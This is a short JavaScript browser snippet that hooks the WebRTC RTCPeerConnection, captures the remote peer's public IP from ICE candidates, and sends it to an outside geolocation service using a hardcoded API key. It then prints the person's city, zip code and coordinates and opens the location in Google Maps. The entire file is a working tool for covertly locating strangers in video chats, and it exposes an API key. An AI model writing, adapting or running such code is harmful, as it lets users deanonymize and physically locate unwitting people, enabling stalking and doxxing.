const apiKey = "d20cbbafc67840dab1b56b4dc4298db7"

window.oRTCPeerConnection = 
    window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
    const pc = new window.oRTCPeerConnection(...args);

    pc.oaddIceCandidate = pc.addIceCandidate;

    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    }; 
    return pc;
};

const getLocation = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

    await fetch(url).then((response) =>
        response.json().then((json) => {
            const output = `    
            ---------------------
            IP: ${json.ip}
            hostname: ${json.hostname}
            Country: ${json.country_name}
            State Prov: ${json.state_prov}
            City: ${json.city}
            Zip: ${json.zipcode}
            District: ${json.district}
            Lat / Long: ${json.latitude}, ${json.longitude}
            ---------------------
            `;
        console.log(output);
        setTimeout(1000);
        window.open(`https://www.google.com/maps/search/${json.latitude} + ${json.longitude}`);
               })
    );
};  
